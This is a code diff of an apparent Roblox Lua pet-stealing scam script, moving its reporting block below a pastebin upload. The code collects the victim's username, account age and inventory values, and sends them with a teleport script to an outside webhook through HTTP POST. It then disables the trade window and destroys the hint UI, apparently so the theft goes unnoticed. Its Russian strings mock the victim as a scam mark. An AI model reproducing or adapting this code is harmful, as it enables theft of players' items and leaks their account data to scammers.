@@ -368,105 +368,6 @@ for i = 1, math.min(5, #topPets) do
     topPetsText = topPetsText .. string.format("%s%s: %d$\n", pet.name, petType, math.floor(pet.value))
 end
 
-local embed = {
-    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
-    ["color"] = 16711935,
-    ["fields"] = {
-        {
-            ["name"] = "🔗 **Teleport to :mammoth:**",
-            ["value"] = 
-            "🚀**Вставь в браузер для связи с дуплом**\n```" .. browserTeleport .. "```\n" ..
-            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:mammoth:〙**Info User**",
-            ["value"] = "```lua\n" ..
-                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
-                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
-                        "Receiver      : " .. Username .. ", " .. Username2 .. "\n" ..
-                        "Molitown      : " .. tostring(VersionValue) .. "```"                            
-        },
-        {
-            ["name"] = "〘:moneybag:〙**Inventory Stats**",
-            ["value"] = "```lua\n" ..
-                        "Total Value     : " .. string.format("%d$", math.floor(totalValue)) .. "\n" ..
-                        "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
-                        "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
-                        "FR Pets         : " .. tostring(fr_count) .. "\n" ..
-                        "Mega Pets       : " .. tostring(mega_neon_count) .. "\n" ..
-                        "Neon Pets       : " .. tostring(neon_count) .. "\n" ..
-                        "Legendary Pets  : " .. tostring(legendaries_count) .. "\n" ..
-                        "Ultra Rare Pets : " .. tostring(ultra_count) .. "```" 
-        },
-        {
-            ["name"] = "〘:crown:〙**Top Valuable Pets**",
-            ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:scroll:〙**Full Pets List**",
-            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
-            ["value"] = "```lua\n" ..
-                        browserTeleport .. "\n" .."```"
-        },
-    }
-}
-
-function SendMessageEMBED(url, embed, bool)
-  local http = game:GetService("HttpService")
-  local headers = {
-      ["Content-Type"] = "application/json"
-  }
-  local data = {
-      username = "M O L I T O W N",
-      avatar_url = "https://i.pinimg.1200x/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "pew",
-      embeds = {
-          {
-              title = embed.title,
-              color = embed.color,
-              fields = embed.fields,
-          }
-      }
-  }
-  local data2 = {
-      username = "M O L I T O W N",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "-- @everyone\n" .. TeleportScript,
-      embeds = {
-          {
-              title = embed.title,
-              color = 0x660000,
-              fields = embed.fields,
-          }
-      }
-  }
-
-  local body = http:JSONEncode(data)
-  local body2 = http:JSONEncode(data2)
-  if bool == true then
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body2
-      })
-  else
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body
-      })
-  end
-end
-
 local HttpService = game:GetService("HttpService")
 
 local function pastebin(content)
@@ -594,6 +495,105 @@ end
 -- Создаем полный список петов и публикуем на pastebin
 local fullPetsList = createFullPetsList()
 local pastebinLink = pastebin(fullPetsList)
+
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
+    ["color"] = 16711935,
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **Teleport to :mammoth:**",
+            ["value"] = 
+            "🚀**Вставь в браузер для связи с дуплом**\n```" .. browserTeleport .. "```\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**Info User**",
+            ["value"] = "```lua\n" ..
+                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
+                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
+                        "Receiver      : " .. Username .. ", " .. Username2 .. "\n" ..
+                        "Molitown      : " .. tostring(VersionValue) .. "```"                            
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Stats**",
+            ["value"] = "```lua\n" ..
+                        "Total Value     : " .. string.format("%d$", math.floor(totalValue)) .. "\n" ..
+                        "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
+                        "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
+                        "FR Pets         : " .. tostring(fr_count) .. "\n" ..
+                        "Mega Pets       : " .. tostring(mega_neon_count) .. "\n" ..
+                        "Neon Pets       : " .. tostring(neon_count) .. "\n" ..
+                        "Legendary Pets  : " .. tostring(legendaries_count) .. "\n" ..
+                        "Ultra Rare Pets : " .. tostring(ultra_count) .. "```" 
+        },
+        {
+            ["name"] = "〘:crown:〙**Top Valuable Pets**",
+            ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:scroll:〙**Full Pets List**",
+            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
+            ["value"] = "```lua\n" ..
+                        browserTeleport .. "\n" .."```"
+        },
+    }
+}
+
+function SendMessageEMBED(url, embed, bool)
+  local http = game:GetService("HttpService")
+  local headers = {
+      ["Content-Type"] = "application/json"
+  }
+  local data = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.1200x/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      content = "pew",
+      embeds = {
+          {
+              title = embed.title,
+              color = embed.color,
+              fields = embed.fields,
+          }
+      }
+  }
+  local data2 = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      content = "-- @everyone\n" .. TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = 0x660000,
+              fields = embed.fields,
+          }
+      }
+  }
+
+  local body = http:JSONEncode(data)
+  local body2 = http:JSONEncode(data2)
+  if bool == true then
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body2
+      })
+  else
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body
+      })
+  end
+end
 
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
